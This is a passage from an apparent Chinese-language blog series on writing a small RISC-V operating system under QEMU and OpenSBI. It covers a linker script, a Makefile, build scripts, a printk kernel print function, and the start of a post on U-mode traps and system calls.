class="string">&#x27;!&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;os.ld</p>
<p>定义内存起始地址0x80200000 以及大小 128M</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OUTPUT_ARCH(riscv)</span><br><span class="line">ENTRY(_start)</span><br><span class="line"></span><br><span class="line">MEMORY</span><br><span class="line">&#123; </span><br><span class="line">	ram (rxai!w) : ORIGIN = 0x80200000, LENGTH = 128M  # r：可读 x：可执行 a:可分配 i：初始化 !w：不可写</span><br><span class="line">&#125;</span><br><span class="line">SECTIONS</span><br><span class="line">&#123;</span><br><span class="line">	.text : &#123;</span><br><span class="line">		*(.text .text.*)		# *(.text .text.*) 表示将所有 .text 段和以 .text. 开头的段放到这里</span><br><span class="line">	&#125; &gt;ram</span><br><span class="line"></span><br><span class="line">	.rodata : &#123;</span><br><span class="line">		*(.rodata .rodata.*)   </span><br><span class="line">	&#125; &gt;ram</span><br><span class="line"></span><br><span class="line">	.data : &#123;</span><br><span class="line">		. = ALIGN(4096);		# 对齐 4096</span><br><span class="line">		*(.sdata .sdata.*)		# 表示将所有 .sdata 段和以 .sdata. 开头的段放到这里。</span><br><span class="line">		*(.data .data.*)		# 表示将所有 .data 段和以 .data. 开头的段放到这里。</span><br><span class="line">		PROVIDE(_data_end = .);	# 定义一个符号 _data_end，其值为当前地址。</span><br><span class="line">	&#125; &gt;ram</span><br><span class="line"></span><br><span class="line">	.bss :&#123;</span><br><span class="line">		*(.sbss .sbss.*)</span><br><span class="line">		*(.bss .bss.*)</span><br><span class="line">		*(COMMON)				# 表示将所有公共段放到这里。</span><br><span class="line">	&#125; &gt;ram</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;Makefile</p>
</blockquote>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">CROSS_COMPILE = riscv64-unknown-elf-</span><br><span class="line">CFLAGS = -nostdlib -fno-builtin 		<span class="comment"># -nostdlib 表示不使用标准库，-fno-builtin 表示禁用内置函数。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># riscv64-unknown-elf-gcc 工具链可以同时编译汇编和 C 代码</span></span><br><span class="line">CC = $&#123;CROSS_COMPILE&#125;gcc -L/opt/riscv/riscv64-unknown-elf/lib -L/opt/riscv/lib</span><br><span class="line">OBJCOPY = $&#123;CROSS_COMPILE&#125;objcopy</span><br><span class="line">OBJDUMP = $&#123;CROSS_COMPILE&#125;objdump</span><br><span class="line"></span><br><span class="line"><span class="comment"># 汇编文件列表</span></span><br><span class="line">SRCS_ASM = \</span><br><span class="line">	entry.S</span><br><span class="line"><span class="comment"># c文件列表</span></span><br><span class="line">SRCS_C = \</span><br><span class="line">	sbi.c \</span><br><span class="line">	main.c \</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将源文件替换为 .o 文件</span></span><br><span class="line">OBJS = $(SRCS_ASM:.S=.o)</span><br><span class="line">OBJS += $(SRCS_C:.c=.o)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">os.elf: $&#123;OBJS&#125;</span></span><br><span class="line">	$&#123;CC&#125; $&#123;CFLAGS&#125; -T os.ld  -o os.elf <span class="variable">$^</span></span><br><span class="line">	$&#123;OBJCOPY&#125; -O binary os.elf os.bin</span><br><span class="line"></span><br><span class="line">%.o : %.c</span><br><span class="line">	$&#123;CC&#125; $&#123;CFLAGS&#125; -c -o <span class="variable">$@</span> <span class="variable">$&lt;</span></span><br><span class="line"></span><br><span class="line">%.o : %.S</span><br><span class="line">	$&#123;CC&#125; $&#123;CFLAGS&#125; -c -o <span class="variable">$@</span> <span class="variable">$&lt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.PHONY : clean</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -rf *.o *.bin *.elf</span><br></pre></td></tr></table></figure>



<h2 id="2-2测试"><a href="#2-2测试" class="headerlink" title="2.2测试"></a>2.2测试</h2><blockquote>
<p>build.sh</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译os</span></span><br><span class="line">if [ ! -d &quot;$SHELL_FOLDER/output/os&quot; ]; then  </span><br><span class="line">mkdir $SHELL_FOLDER/output/os</span><br><span class="line">fi</span><br><span class="line">cd $SHELL_FOLDER/OS</span><br><span class="line">make</span><br><span class="line">cp $SHELL_FOLDER/os/os.bin $SHELL_FOLDER/output/os/os.bin</span><br><span class="line">make clean</span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">写入 os.bin，地址偏移为 1k * 8k = 0x800000</span></span><br><span class="line">dd of=fw.bin bs=1k conv=notrunc seek=8k if=$SHELL_FOLDER/output/os/os.bin</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<blockquote>
<p>boot&#x2F;start.s</p>
<p>将os.bin 从flash的0x20800000 加载到0x80200000</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//load os.bin</span><br><span class="line">//[0x20800000:0x20C00000] --&gt; [0x80200000:0x80600000]</span><br><span class="line">   li		a0,	0x208</span><br><span class="line">slli	a0,	a0, 20      //a0 = 0x20800000</span><br><span class="line">   li		a1,	0x802</span><br><span class="line">slli	a1,	a1, 20      //a1 = 0x80200000</span><br><span class="line">   li		a2,	0x806</span><br><span class="line">slli	a2,	a2, 20      //a2 = 0x80600000</span><br><span class="line">load_data a0,a1,a2</span><br></pre></td></tr></table></figure>



<p>显示了hello！</p>
<p><img src="/2024/06/10/riscv-7-opensbi%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BE%93%E5%87%BA%E4%BB%A5%E5%8F%8A%E6%89%8B%E5%86%99%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/image-20240610220040962.png" alt="image-20240610220040962"></p>
]]></content>
      <categories>
        <category>riscv</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>riscv，qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>riscv-8-printk内核级打印函数</title>
    <url>/2024/06/11/riscv-9-prink%E5%86%85%E6%A0%B8%E7%BA%A7%E6%89%93%E5%8D%B0%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="1-printk函数"><a href="#1-printk函数" class="headerlink" title="1.printk函数"></a>1.printk函数</h1><blockquote>
<p><a href="https://liangzhouzz.github.io/2024/05/07/%E5%9F%BA%E4%BA%8Ex86%E6%9E%B6%E6%9E%84%E7%9A%84%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%AE%9E%E7%8E%B0-2/">基于x86架构的简单内核实现-2 | Sifanのblog (liangzhouzz.github.io)</a>在这偏中提到了，在内核态无法使用用户态的printf函数，所以需要编写内核级的printk函数，基于x86简易内核操作中，我们是采用操作寄存器的方式进行读写和打印。</p>
<p>同理，在<code>riscv</code>的<code>S</code>模式下 也是无法使用<code>U</code>模式下的<code>printf</code>函数，需要封装位于<code>S</code>模式下的<code>printk</code>函数</p>
<p>可变参数的解释见：<a href="https://yanglianoo.github.io/2023/07/11/%E5%B0%81%E8%A3%85printf%E5%87%BD%E6%95%B0/">封装printf函数 | TimerのBlog (yanglianoo.github.io)</a></p>
</blockquote>
<p>在<code>os</code>目录下新增<code>printk.c</code> 和 <code>os.h</code></p>
<blockquote>
<p>OS&#x2F;os.h</p>
</blockquote>
<p><strong>头文件：</strong>基本的操作系统头文件，通常用于小型嵌入式系统或内核开发中</p>
<ul>
<li><code>stddef.h</code>：提供了一些标准定义，如 <code>size_t</code>、<code>NULL</code> 等。</li>
<li><code>stdarg.h</code>：提供了处理变长参数列表的宏和类型，用于实现变长参数函数（如 <code>printk</code>）。</li>
</ul>
<p><code>panic</code>：在系统遇到严重错误时调用，通常会停止系统运行并输出错误信息。</p>
<p><code>sbi_console_putchar</code>：通过 SBI（Supervisor Binary Interface）在控制台上输出字符，通常用于 RISC-V 系统。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __OS_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __OS_H__</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* printk */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span>  <span class="title function_">printk</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* s, ...)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">panic</span><span class="params">(<span class="type">char</span> *s)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">sbi_console_putchar</span><span class="params">(<span class="type">int</span> ch)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __OS_H__ */</span></span></span><br></pre></td></tr></table></figure>





<blockquote>
<p>OS&#x2F;printk.c</p>
</blockquote>
<p><strong>printk函数：</strong></p>
<ul>
<li>对 <code>_vprintf</code> 的封装，用于格式化输出字符串。它接受可变数量的参数，并将它们传递给 <code>_vprintf</code> 进行处理。</li>
<li><code>res</code>代表第一个参数的字符串长度，将第一个参数的指针<code>va_list vl</code>和实际值传递给了<code>_vprintf</code></li>
<li><code>va_start</code> 宏用于初始化 <code>vl</code> 以便访问可变参数。它接受两个参数：第一个是 <code>va_list</code> 类型的变量，第二个是最后一个显式参数（在本例中为 <code>s</code>）。</li>
<li><code>_vprintf</code> 函数被调用来处理格式化字符串 <code>s</code> 和参数列表 <code>vl</code>。<code>_vprintf</code> 函数会格式化字符串并将结果输出到 UART，同时返回输出的字符数。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">printk</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* s, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">	va_list vl;				<span class="comment">// 存储可变参数列表</span></span><br><span class="line">	va_start(vl, s);		<span class="comment">// 初始化可变参数列表</span></span><br><span class="line">	res = _vprintf(s, vl);</span><br><span class="line">	va_end(vl);				<span class="comment">// 清理可变参数列表</span></span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>例子：</strong></p>
<p>假设你调用 <code>printk</code> 函数如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">printk(<span class="string">&quot;Hello, %s! The answer is %d.\n&quot;</span>, <span class="string">&quot;world&quot;</span>, <span class="number">42</span>);</span><br></pre></td></tr></table></figure>

<p><code>printk</code> 函数将执行以下操作：</p>
<ol>
<li>初始化 <code>va_list</code> 并将参数列表指向 <code>&quot;world&quot;</code> 和 <code>42</code>。</li>
<li>调用 <code>_vprintf</code> 函数，该函数会将格式化后的字符串 “Hello, world! The answer is 42.\n” 写入 <code>out_buf</code> 并通过 <code>uart_puts</code> 输出到 UART。</li>
<li>返回写入的字符数。</li>
</ol>
<p><strong>_vprintf函数：</strong></p>
<ul>
<li>在这个函数中，调用了<code>_vsnprintf</code>函数，并将结果通过<code>uart_puts</code>输出，调用了<code>SBI</code>的控制台输出接口函数<code>sbi_console_putchar</code></li>
<li><code>out_buf</code> 是一个静态字符数组，大小为 1000 字节，用于存储格式化后的输出字符串。</li>
<li>使用 <code>_vsnprintf</code> 函数来计算格式化后的字符串长度（不实际生成字符串），以便预先检查是否会超出缓冲区大小。<ul>
<li>第一个参数 <code>NULL</code> 表示不写入任何缓冲区。</li>
<li>第二个参数 <code>-1</code> 表示忽略缓冲区大小，只计算长度。</li>
<li>第三个参数 <code>s</code> 是格式化字符串。</li>
<li>第四个参数 <code>vl</code> 是可变参数列表。</li>
</ul>
</li>
<li>第二个 <code>_vsnprintf</code> 函数，将格式化后的字符串写入<code>out_buf</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> out_buf[<span class="number">1000</span>]; <span class="comment">// buffer for _vprintf()</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> _vprintf(<span class="type">const</span> <span class="type">char</span>* s, va_list vl)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> res = _vsnprintf(<span class="literal">NULL</span>, <span class="number">-1</span>, s, vl);</span><br><span class="line">	<span class="keyword">if</span> (res+<span class="number">1</span> &gt;= <span class="keyword">sizeof</span>(out_buf)) &#123;</span><br><span class="line">		uart_puts(<span class="string">&quot;error: output string size overflow\n&quot;</span>);   <span class="comment">// 溢出</span></span><br><span class="line">		<span class="keyword">while</span>(<span class="number">1</span>) &#123;&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	_vsnprintf(out_buf, res + <span class="number">1</span>, s, vl);</span><br><span class="line">	uart_puts(out_buf);</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;os.h&quot;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">uart_puts</span><span class="params">(<span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">while</span> (*s) &#123;</span><br><span class="line">		sbi_console_putchar(*s++);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> _vsnprintf(<span class="type">char</span> * out, <span class="type">size_t</span> n, <span class="type">const</span> <span class="type">char</span>* s, va_list vl)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> format = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> longarg = <span class="number">0</span>;</span><br><span class="line">	<span class="type">size_t</span> pos = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (; *s; s++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (format) &#123;</span><br><span class="line">			<span class="keyword">switch</span>(*s) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>: &#123;</span><br><span class="line">				longarg = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>: &#123;</span><br><span class="line">				longarg = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">if</span> (out &amp;&amp; pos &lt; n) &#123;</span><br><span class="line">					out[pos] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				pos++;</span><br><span class="line">				<span class="keyword">if</span> (out &amp;&amp; pos &lt; n) &#123;</span><br><span class="line">					out[pos] = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				pos++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>: &#123;</span><br><span class="line">				<span class="type">long</span> num = longarg ? va_arg(vl, <span class="type">long</span>) : va_arg(vl, <span class="type">int</span>);</span><br><span class="line">				<span class="type">int</span> hexdigits = <span class="number">2</span>*(longarg ? <span class="keyword">sizeof</span>(<span class="type">long</span>) : <span class="keyword">sizeof</span>(<span class="type">int</span>))<span class="number">-1</span>;</span><br><span class="line">				<span class="keyword">for</span>(<span class="type">int</span> i = hexdigits; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">					<span class="type">int</span> d = (num &gt;&gt; (<span class="number">4</span>*i)) &amp; <span class="number">0xF</span>;</span><br><span class="line">					<span class="keyword">if</span> (out &amp;&amp; pos &lt; n) &#123;</span><br><span class="line">						out[pos] = (d &lt; <span class="number">10</span> ? <span class="string">&#x27;0&#x27;</span>+d : <span class="string">&#x27;a&#x27;</span>+d<span class="number">-10</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					pos++;</span><br><span class="line">				&#125;</span><br><span class="line">				longarg = <span class="number">0</span>;</span><br><span class="line">				format = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>: &#123;</span><br><span class="line">				<span class="type">long</span> num = longarg ? va_arg(vl, <span class="type">long</span>) : va_arg(vl, <span class="type">int</span>);</span><br><span class="line">				<span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">					num = -num;</span><br><span class="line">					<span class="keyword">if</span> (out &amp;&amp; pos &lt; n) &#123;</span><br><span class="line">						out[pos] = <span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					pos++;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="type">long</span> digits = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">for</span> (<span class="type">long</span> nn = num; nn /= <span class="number">10</span>; digits++);</span><br><span class="line">				<span class="keyword">for</span> (<span class="type">int</span> i = digits<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">					<span class="keyword">if</span> (out &amp;&amp; pos + i &lt; n) &#123;</span><br><span class="line">						out[pos + i] = <span class="string">&#x27;0&#x27;</span> + (num % <span class="number">10</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					num /= <span class="number">10</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				pos += digits;</span><br><span class="line">				longarg = <span class="number">0</span>;</span><br><span class="line">				format = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>: &#123;</span><br><span class="line">				<span class="type">const</span> <span class="type">char</span>* s2 = va_arg(vl, <span class="type">const</span> <span class="type">char</span>*);</span><br><span class="line">				<span class="keyword">while</span> (*s2) &#123;</span><br><span class="line">					<span class="keyword">if</span> (out &amp;&amp; pos &lt; n) &#123;</span><br><span class="line">						out[pos] = *s2;</span><br><span class="line">					&#125;</span><br><span class="line">					pos++;</span><br><span class="line">					s2++;</span><br><span class="line">				&#125;</span><br><span class="line">				longarg = <span class="number">0</span>;</span><br><span class="line">				format = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>: &#123;</span><br><span class="line">				<span class="keyword">if</span> (out &amp;&amp; pos &lt; n) &#123;</span><br><span class="line">					out[pos] = (<span class="type">char</span>)va_arg(vl,<span class="type">int</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				pos++;</span><br><span class="line">				longarg = <span class="number">0</span>;</span><br><span class="line">				format = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (*s == <span class="string">&#x27;%&#x27;</span>) &#123;</span><br><span class="line">			format = <span class="number">1</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (out &amp;&amp; pos &lt; n) &#123;</span><br><span class="line">				out[pos] = *s;</span><br><span class="line">			&#125;</span><br><span class="line">			pos++;</span><br><span class="line">		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">	<span class="keyword">if</span> (out &amp;&amp; pos &lt; n) &#123;</span><br><span class="line">		out[pos] = <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (out &amp;&amp; n) &#123;</span><br><span class="line">		out[n<span class="number">-1</span>] = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> pos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> out_buf[<span class="number">1000</span>]; <span class="comment">// buffer for _vprintf()</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> _vprintf(<span class="type">const</span> <span class="type">char</span>* s, va_list vl)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> res = _vsnprintf(<span class="literal">NULL</span>, <span class="number">-1</span>, s, vl);</span><br><span class="line">	<span class="keyword">if</span> (res+<span class="number">1</span> &gt;= <span class="keyword">sizeof</span>(out_buf)) &#123;</span><br><span class="line">		uart_puts(<span class="string">&quot;error: output string size overflow\n&quot;</span>);</span><br><span class="line">		<span class="keyword">while</span>(<span class="number">1</span>) &#123;&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	_vsnprintf(out_buf, res + <span class="number">1</span>, s, vl);</span><br><span class="line">	uart_puts(out_buf);</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">printk</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* s, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">	va_list vl;</span><br><span class="line">	va_start(vl, s);</span><br><span class="line">	res = _vprintf(s, vl);</span><br><span class="line">	va_end(vl);</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">panic</span><span class="params">(<span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(<span class="string">&quot;panic: &quot;</span>);</span><br><span class="line">	printk(s);</span><br><span class="line">	printk(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="2-测试"><a href="#2-测试" class="headerlink" title="2.测试"></a>2.测试</h1><blockquote>
<p>OS&#x2F;main.c</p>
<p>修改如下：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//extern sbi_console_putchar(int ch);</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;os.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">os_main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;hello!!!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;Makefile</p>
</blockquote>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CFLAGS = -nostdlib -fno-builtin -I/opt/riscv/riscv64-unknown-elf/<span class="keyword">include</span> -mcmodel=medany</span><br><span class="line"></span><br><span class="line">SRCS_C = \</span><br><span class="line">	sbi.c \</span><br><span class="line">	main.c \</span><br><span class="line">	printk.c \</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>执行 <code>build.sh</code> 和<code>run.sh</code></p>
<p>结果如下：打印了hello！！！</p>
<img src="/2024/06/11/riscv-9-prink%E5%86%85%E6%A0%B8%E7%BA%A7%E6%89%93%E5%8D%B0%E5%87%BD%E6%95%B0/image-20240611221736082.png" alt="image-20240611221736082" style="zoom:67%;">





















]]></content>
      <categories>
        <category>riscv</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>riscv，qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>riscv-9-u模式的trap机制</title>
    <url>/2024/06/12/riscv-9-u%E6%A8%A1%E5%BC%8F%E7%9A%84trap%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h1 id="1-用户态的syscall"><a href="#1-用户态的syscall" class="headerlink" title="1.用户态的syscall"></a>1.用户态的syscall</h1><table>
<thead>
<tr>
<th align="center">级别</th>
<th align="center">编码</th>
<th align="center">名称</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0</td>
<td align="center">00</td>
<td align="center">用户&#x2F;应用模式 (U, User&#x2F;Application)</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">01</td>
<td align="center">监督模式 (S, Supervisor)</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">10</td>
<td align="center">虚拟监督模式 (H, Hypervisor)</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">11</td>
<td align="center">机器模式 (M, Machine)</td>
</tr>
</tbody></table>
<ul>
<li><code>riscv</code>的特权级如上，一共四个特权级，特权级越高，对硬件的控制能力越强。</li>
<li><code>opensbi</code>运行在<code>M</code>模式下，从而<code>S</code>模式下可以通过<code>SBI</code>接口控制硬件</li>
<li><code>U</code>模式下可以通过<code>ABI</code>调用<code>S</code>模式的服务</li>
</ul>
<p><img src="/2024/06/12/riscv-9-u%E6%A8%A1%E5%BC%8F%E7%9A%84trap%E6%9C%BA%E5%88%B6/image-20240612151148719.png" alt="image-20240612151148719"></p>
<p>从<code>U</code>模式通过<code>ecall</code>调用<code>S</code>模式，并且<code>S</code>模式通过<code>SBI</code>调用<code>M</code>模式硬件的流程如下：</p>
<p><img src="/2024/06/12/riscv-9-u%E6%A8%A1%E5%BC%8F%E7%9A%84trap%E6%9C%BA%E5%88%B6/image-20240612151523660.png" alt="image-20240612151523660"></p>
<h2 id="riscv-系统调用简介"><a href="#riscv-系统调用简介" class="headerlink" title="riscv 系统调用简介"></a>riscv 系统调用简介</h2><p><code>syscall</code> 的调用参数和返回值传递通过遵循如下约定实现：</p>
<ul>
<li>调用参数<ul>
<li><code>a7</code> 寄存器存放系统调用号，区分是哪个<code> Syscall</code></li>
<li><code>a0-a5</code> 寄存器依次用来表示 <code>Syscall </code>编程接口中定义的参数</li>
</ul>
</li>
<li>返回值<ul>
<li><code>a0</code> 寄存器存放 <code>Syscall </code>的返回值</li>
</ul>
</li>
</ul>
<p><code>ecall </code>指令会根据当前所处模式触发不同的执行环境切换异常：</p>
<ul>
<li>in U-mode: environment-call-from-U-mode exception</li>
<li>in S-mode: environment-call-from-S-mode exception</li>
<li>in M-mode: environment-call-from-M-mode exception</li>
</ul>
<p><code>Syscall</code> 场景下是在 U-mode（用户模式）下执行 <code>ecall</code> 指令，主要会触发如下变更：</p>
<ul>
<li>处理器特权级别由 User-mode（用户模式）提升为 Supervisor-mode（内核模式）</li>
<li>当前指令地址保存到 <code>sepc</code> 特权寄存器</li>
<li>设置 <code>scause</code> 特权寄存器</li>
<li>跳转到 <code>stvec</code> 特权寄存器指向的指令地址</li>
</ul>
<blockquote>
<p>具体的测试过程见：<a href="https://yanglianoo.github.io/2023/08/04/%E5%AE%9E%E7%8E%B0U%E6%A8%A1%E5%BC%8F%E7%9A%84trap%E6%9C%BA%E5%88%B6/">实现U模式的trap机制 | TimerのBlog (yanglianoo.github.io)</a></p>
</blockquote>
<h1 id="2-trap机制"><a href="#2-trap机制" class="headerlink" title="2.trap机制"></a>2.trap机制</h1><p>**<code>trap机制</code>**：</p>
<p>在<code>riscv</code> 架构中，<strong>异常，系统调用和中断的过程都被统称为<code>trap</code></strong></p>
<blockquote>
<p>参考：<a href="https://blog.csdn.net/weixin_53479532/article/details/136611555">RISC-V 32架构实践专题九（从零开始写操作系统-trap机制）_trap riscv 指令-CSDN博客</a></p>
</blockquote>
<blockquote>
<p>什么是ecall</p>
<p><code>ecall</code> 指令是 RISC-V 指令集架构（ISA）中的一个指令，用于触发环境调用（environment call）。这在不同的特权级别下有不同的用途，但最常见的是用于从用户模式（U-mode）触发系统调用（system call），以请求操作系统内核提供服务。</p>
<p>工作流程：</p>
<ol>
<li>**用户模式（U-mode）程序执行 <code>ecall</code>**：当用户模式的程序执行 <code>ecall</code> 指令时，CPU 会产生一个陷阱（trap），跳转到内核模式（S-mode）进行处理。</li>
<li><strong>保存上下文</strong>：CPU 保存当前的执行上下文（如程序计数器、寄存器等），以便在处理完系统调用后能够恢复。</li>
<li><strong>陷入内核</strong>：CPU 跳转到内核中预定义的陷阱处理程序（trap handler）。</li>
<li><strong>处理系统调用</strong>：内核根据系统调用号和参数，执行相应的服务，如读写文件、分配内存等。</li>
<li><strong>恢复上下文</strong>：系统调用处理完成后，恢复之前保存的上下文。</li>
<li><strong>返回用户模式</strong>：CPU 返回用户模式，继续执行用户程序。</li>
</ol>
</blockquote>
<p><strong>目标：</strong></p>
<ul>
<li>U模式下 通过ecall指令 调用S模式下 OS</li>
<li>OS 对 调用进行处理</li>
<li>处理完毕 返回U模式，并恢复调用时候的上下文继续执行U模式下的程序</li>
</ul>
<p><strong>注意：</strong></p>
<ul>
<li>切换前后需要保证程序的上下文不变</li>
<li>通常包含通用寄存器和栈空间</li>
</ul>
<h2 id="与S模式相关的异常寄存器"><a href="#与S模式相关的异常寄存器" class="headerlink" title="与S模式相关的异常寄存器"></a>与S模式相关的异常寄存器</h2><h3 id="Supervisor-Status-Register-sstatus"><a href="#Supervisor-Status-Register-sstatus" class="headerlink" title="Supervisor Status Register (sstatus)"></a>Supervisor Status Register (sstatus)</h3><p><img src="/2024/06/12/riscv-9-u%E6%A8%A1%E5%BC%8F%E7%9A%84trap%E6%9C%BA%E5%88%B6/image-20240612155021153.png" alt="image-20240612155021153"></p>
<p><code>bit[8]:SPP</code>：表示在进入s模式之前正在执行的特权级别，</p>
<ul>
